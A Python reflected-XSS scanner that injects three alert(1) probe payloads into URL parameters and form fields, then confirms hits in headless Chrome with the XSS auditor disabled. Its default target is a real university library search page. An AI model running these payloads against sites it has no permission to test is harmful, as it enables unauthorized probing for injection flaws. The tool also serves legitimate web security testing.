#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-

import requests
import re
from selenium import webdriver


class Xss:
    def __init__(self, targets):
        self.targets = targets
        self.target = ''

        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument("--headless")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument("--window-size=1920x1080")
        self.chrome_options.add_argument("--disable-xss-auditor")
        # 禁用图片
        chrome_prefs = {}
        chrome_prefs["profile.default_content_settings"] = {"images": 2}
        self.chrome_options.experimental_options["prefs"] = chrome_prefs

        self.header = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
        self.payloads = ['\'"/><img src=# onerror=alert(1);>',
                         "\'\"><body onload=alert(1)>",
                         "/></script><ScRiPt>alert(1);<ScRiPt><!--"]

    def init(self):
        if not self.target.startswith('http://') and not self.target.startswith('https://'):
            self.target = 'http://' + self.target
        if not self.target.endswith('/'):
            self.target += '/'

    def reflect_xss(self):
        # http://demo.aisec.cn/demo/aisec/js_link.php?id=2&msg=abc
        if '?' in self.target:
            for params in self.target.split('&'):
                for payload in self.payloads:
                    target = self.target.replace(params, params+payload)
                    try:
                        r = requests.get(target, headers=self.header, timeout=2)
                    except requests.exceptions.ConnectionError:
                        continue
                    except requests.exceptions.ReadTimeout:
                        continue
                    if payload in r.text:
                        if self.check(target):
                            print('可能存在xss漏洞\t'+target)

    def check(self, url):
        driver = webdriver.Chrome(chrome_options=self.chrome_options)
        driver.get(url)
        try:
            alert = driver.switch_to.alert
            if alert.text == '1':
                return True
        except:
            pass
        return False

    def _scan(self):
        try:
            r = requests.get(self.target, headers=self.header, timeout=2)
            # print('get')
        except requests.exceptions.ConnectionError:
            return False
        except requests.exceptions.TooManyRedirects:
            return False
        except requests.exceptions.ReadTimeout:
            return False
        except requests.exceptions.ChunkedEncodingError:
            return False
        pattern = re.compile('<input.*?type="text".*?name=[\'|\"](.*?)[\'|\"].*?')
        names = re.findall(pattern, r.text)
        for name in names:
            for payload in self.payloads:
                try:
                    r = requests.post(self.target, data={name: payload}, timeout=2)
                    if payload in r.text:
                        return self.target
                except ConnectionResetError:
                    print('连接中断')
                    break
                except Exception as e:
                    print(e)
                    continue
                return False

    def scan(self):
        print('\nxss检测\n')
        for self.target in self.targets:
            self.init()
            self.reflect_xss()


if __name__ == '__main__':
    Xss(['http://opac.jit.edu.cn/asord/asord_searchresult.php?type=02&q=&submit=%E6%A3%80%E7%B4%A2']).scan()
